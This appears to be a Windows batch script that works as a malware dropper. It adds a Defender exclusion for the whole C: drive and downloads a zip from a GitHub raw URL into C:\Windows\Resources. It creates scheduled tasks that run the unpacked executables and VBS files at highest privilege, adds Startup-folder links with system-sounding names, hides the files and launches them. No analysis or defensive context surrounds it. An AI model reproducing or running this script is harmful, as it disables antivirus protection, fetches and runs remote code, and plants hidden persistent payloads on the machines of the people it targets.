powershell.exe Add-MpPreference -ExclusionPath C:\

powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Upload96/UploadDownload/main/Pictures.zip','C:\Windows\Resources\Pictures.zip')"

cd C:\Windows\Resources

tar -xf Pictures.zip

move SessionHolder.vbs C:\Windows\Resources\Themes\aero\shell

schtasks /CREATE /SC DAILY /TN "MyTasks\88" /TR "C:\Windows\Resources\BluePrint.exe" /RL HIGHEST /f

schtasks /CREATE /SC HOURLY /TN "MyTasks\89" /TR "C:\Windows\Resources\Themes\aero\shell\SessionHolder.vbs" /RL HIGHEST /f

schtasks /CREATE /SC DAILY /TN "MyTasks\90" /TR "C:\Windows\Resources\task.exe" /RL HIGHEST /f

powershell -Command "& {$StartUp= Join-Path $Env:USERPROFILE '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'; New-Item -ItemType SymbolicLink -Path "$StartUp" -Name "HostKeys.lnk" -Target "C:\Windows\Resources\ICUE.vbs"}

powershell -Command "& {$StartUp= Join-Path $Env:USERPROFILE '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'; New-Item -ItemType SymbolicLink -Path "$StartUp" -Name "HostSettings.lnk" -Target "C:\Windows\Resources\vbs.vbs"}


attrib +h task.exe

attrib +h vbs.vbs

attrib +h BluePrint.exe

attrib +h Utzs.exe

attrib +h Pictures.zip

attrib +h ICUE.vbs

start task.exe

start vbs.vbs

move EXECUTE.bat C:\Windows\Resources\Themes\aero\shell

